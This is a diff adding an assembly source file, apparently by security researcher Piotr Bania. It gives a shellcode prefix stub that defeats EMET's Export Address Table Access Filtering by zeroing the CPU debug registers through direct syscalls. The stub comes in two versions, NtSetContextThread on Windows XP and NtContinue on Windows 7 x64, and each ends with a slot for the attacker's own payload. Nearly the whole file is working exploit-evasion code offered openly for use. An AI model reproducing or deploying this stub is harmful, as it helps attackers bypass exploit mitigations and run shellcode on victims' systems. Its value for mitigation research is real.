@@ -1,0 +1,122 @@
+
+; BYPASSING EMET Export Address Table Access Filtering feature
+; ------------------------------------------------------------------
+; just a simple stub for shellcode that erases debug registers
+; therefore no more emet breakpoints (no EAF anymore)
+; if you want to use it on other systems (than XP) just change the
+; NtSetContextThread_XP syscall value.
+; ------------------------------------------------------------------
+;
+; and just for you information what is EAF (from the help file):
+;
+; In order to do something "useful", shellcode generally needs to call 
+; Windows APIs. However, in order to call an API, shellcode must first 
+; find the address where that API has been loaded. To do this the vast 
+; majority of shellcode iterates through the export address table of all 
+; loaded modules, looking for modules that contain useful APIs. Typically 
+; this involves kernel32.dll or ntdll.dll. Once an interesting module has 
+; been found, the shellcode can then figure out the address where an API 
+; in that module resides. This mitigation filters accesses to the Export 
+; Address Table (EAT), allowing or disallowing the read/write access based 
+; on the calling code. With EMET in place, most of today?s shellcode will 
+; be blocked when it tries to lookup the APIs needed for its payload. 
+;
+;
+;
+; SMALL UPDATE 03/2014:
+; --------------------
+;
+; Just a hint for people that still use this thing (never had enough motivation
+; to write this crap down):
+; Back in the day one of the most heavily used antidebugging method was to use 
+; NtContinue api function (directly or through SEH) to resume execution
+; from a given CONTEXT. So long story short you can clear your debug registers
+; by calling NtContinue. The syscall number for <=Win7 is 0x40 (on Win8=0x41,
+; on Win8.1=0x42). Sample code is provided at the bottom of this file. 
+;
+;
+; - Piotr Bania / www.piotrbania.com
+
+
+;
+; ---------- EXAMPLE OF USING NtSetContextThread on XP -----------------------
+; (tasm style)
+
+CONTEXT_SIZE			equ	0000002cch
+CURRENT_THREAD			equ	0FFFFFFFEh
+NtSetContextThread_XP		equ 	0000000D5h
+
+
+mov		ebx, esp
+sub		esp, CONTEXT_SIZE
+mov		dword ptr [esp], CONTEXT_DEBUG_REGISTERS	
+	
+
+; well zeroing entire struct is not necessary but who cares.
+mov		edi, esp
+mov		ecx, CONTEXT_SIZE
+add		edi, 4
+sub		ecx, 4
+xor		eax,eax
+rep		stosb
+
+
+push		esp			; context
+push		CURRENT_THREAD		
+
+call		get_delta
+get_delta:	pop 	edx
+
+
+lea		eax, [edx + (offset my_ret - offset get_delta)]
+push		eax
+push		eax
+
+mov		edx, esp
+mov		eax, NtSetContextThread_XP
+db		0Fh, 034h			;	sysenter
+my_ret:   
+mov		esp, ebx
+
+
+
+; *** you are now free, no debug breakpoints ***
+
+<write your standard shellcode here...>
+
+
+;
+; ---------- EXAMPLE OF USING NtContinue on Win7 x64 -----------------------
+; (fasm style)
+
+
+CONTEXT_SIZE			equ	0000004d0h
+CONTEXT_FLAGS_OFF		equ 	000000070h
+CONTEXT_DEBUG_REGISTERS		equ	000100010h
+
+NtContinue_WIN7			equ 	000000040h
+
+	
+	sub		rsp, CONTEXT_SIZE
+	and		sp, 0fff0h	
+	
+	mov		rdi, rsp	
+	mov		ecx, CONTEXT_SIZE - 4
+	add		edi, 4
+	xor		eax, eax
+	rep		stosb
+	
+	mov		dword [rsp+CONTEXT_FLAGS_OFF], CONTEXT_DEBUG_REGISTERS	
+		
+	mov		dl, 1
+	mov		r10, rsp		; context
+	lea		rax, [return_point]
+	push		rax
+	
+	xor		rax, rax
+	mov		eax, NtContinue_WIN7	
+	syscall
+	
+return_point:
+
+
